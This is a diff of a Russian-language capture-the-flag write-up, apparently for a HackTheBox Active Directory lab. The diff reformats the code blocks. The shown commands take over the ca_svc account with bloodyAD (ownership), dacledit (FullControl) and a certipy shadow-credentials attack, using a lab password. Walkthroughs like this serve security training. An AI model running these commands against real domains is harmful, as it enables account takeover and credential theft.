@@ -68,15 +68,13 @@ Silvercore_21
 
  Мы можем попытаться сделать райана владельцем ca_svc с помощью этой команды
 
-Копировать код
-bloodyAD --host 10.10.11.51 -d escapetwo.htb -u ryan -p WqSZAF6CysDQbGb3 set owner CA_SVC ryan
+
+    bloodyAD --host 10.10.11.51 -d escapetwo.htb -u ryan -p WqSZAF6CysDQbGb3 set owner CA_SVC ryan
+
 После выполнения этой команды мы видим, что она разрешена. Чтобы получить полный контроль над пользователем ca_svc, мы можем использовать impacket-dacledit следующим образом
 
-Копировать код
-echo "10.10.11.51 sequel.htb" >> /etc/hosts
-Копировать код
-python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"
-После предоставления полного доступа для получения хэша пользователя ca_svc нам нужно выполнить атаку с использованием теневых учётных данных. Эта атака добавляет ключ пользователя ryan в msDS-KeyCredentialLink пользователя ca_svc. После этого пользователь ryan становится копией пользователя ca_svc. Для этого мы можем использовать инструмент certipy следующим образом
+    python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"
+    После предоставления полного доступа для получения хэша пользователя ca_svc нам нужно выполнить атаку с использованием теневых учётных данных. Эта атака добавляет ключ пользователя ryan в msDS-KeyCredentialLink пользователя ca_svc. После этого пользователь ryan становится копией пользователя ca_svc. Для этого мы можем использовать инструмент certipy следующим образом
 
-Копировать код
-certipy shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'
+
+    certipy shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'
